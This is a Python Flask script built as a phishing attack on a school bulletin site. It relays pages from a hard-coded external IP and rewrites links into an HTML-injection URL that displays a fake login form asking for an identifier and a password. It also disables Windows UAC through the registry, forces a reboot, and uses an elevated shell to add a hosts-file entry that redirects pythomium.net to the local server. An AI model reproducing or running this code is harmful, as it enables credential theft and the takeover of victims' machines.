#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os

from urllib.request import urlopen
from bs4 import BeautifulSoup

from subprocess import (
    call,
    check_output
) 

from flask import (
    Flask,
    request 
)

app = Flask(__name__)

@app.route('/bul/<school>.html')
def callPage(school):
    code = urlopen(f"http://81.28.97.146/bul/{school}.html").read()
    code = BeautifulSoup(code, "html.parser")
    for a in code.findAll('a'):
        href = a["href"]
        if href[:15] == "https://bulrezo":
            evil_link = "{}/start/authentNew?lp=x265y110message<P>Connexion+avec+la+BD+établie+le+10-8-2019+à+18h01.<%2FP>%0D%0A&login=</h3><style>h3,%20p%7Bdisplay:%20none%7D</style></div>%20<div%20id='RightZone'>%20<br><br><br>%20<h3%20style='display:%20inline'><img%20src='https://bulrezo17.pythomium.net/static/password64.gif'%20class='icon'>%20Une%20authentification%20est%20requise<br>pour%20accéder%20à%20ce%20site.</h3>%20<h4><br><br><br>Veuillez%20donc%20SVP%20fournir%20ci-dessous%20:<br><br>%20Votre%20identifiant%20:%20<input%20type='text'%20name='login'%20maxlength='15'%20size='8'>%20<br><br>%20Votre%20mot%20de%20passe%20:%20<input%20type='password'%20name='lp'%20maxlength='15'%20size='14'>%20<br><br>%20<input%20type='submit'%20class='button'%20value='%20OK%20'></h4>%20</div><style>".format('/'.join(href.split('/')[:-1]))
            a["href"] = evil_link 

    return str(code)
    
@app.errorhandler(404)
def redirect_real(page):
    # 81.28.97.146
    return f"<iframe style='position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999' src='http://81.28.97.146/{'/'.join(request.base_url.split('/')[3:])}'></iframe>"

def verify_uac() -> bool:
    flag = check_output("reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA".split(' '))
    flag = flag.decode().split("    ")
    #return not int(flag[-1][:-4], 16) 
    return True

def verify_payload() -> bool:
    with open(f"{os.environ['HOMEDRIVE']}\\Windows\\System32\\drivers\\etc\\hosts", 'r') as hosts:
        for host in hosts.readlines():
            if host[0] != '#' and len(host) > 1 and host.split(' ')[1] == "pythomium.net":
                return True 
    return False

def run_as_admin(payload: str):
    payload = f"powershell.exe Start-Process cmd '{payload}' -Verb runas"
    call(payload.split(' '))

if __name__ == "__main__":
    if not verify_uac():
        run_as_admin("/K reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
        call(["shutdown", "-r", "-t", "0"])
    if not verify_payload():
        run_as_admin("/C echo 127.0.0.1 pythomium.net >>%HOMEDRIVE%\\Windows\\System32\\drivers\\etc\\hosts")
    
    app.run(debug=True, host="0.0.0.0", port=80)